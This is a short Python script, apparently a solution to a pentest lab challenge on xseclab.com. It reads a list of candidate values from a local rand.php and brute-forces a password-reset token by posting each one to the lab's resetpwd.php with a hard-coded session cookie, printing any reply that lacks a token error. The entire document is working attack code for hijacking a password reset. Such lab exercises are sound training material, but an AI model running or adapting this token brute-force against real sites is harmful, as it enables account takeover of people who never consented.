import requests
r = requests.get('http://localhost/rand.php')
rlt = r.text.split('<br/>')
rlt = rlt[:-1]
data = {}
header  = {"Cookie":"PHPSESSID=05242b56763620edc599f1daf592b7a9","Referer":"http://lab1.xseclab.com/pentest6_210deacdf09c9fe184d16c8f7288164f/index.php"}
url = 'http://lab1.xseclab.com/pentest6_210deacdf09c9fe184d16c8f7288164f/resetpwd.php'
#重置token
r = requests.get(url,headers=header)

for i in rlt:
    data["token"] = i
    r = requests.post(url,data=data,headers=header)
    r.encoding = r.apparent_encoding
    if "Token_error!" not in r.text[:60]:
        print(r.text[:60])
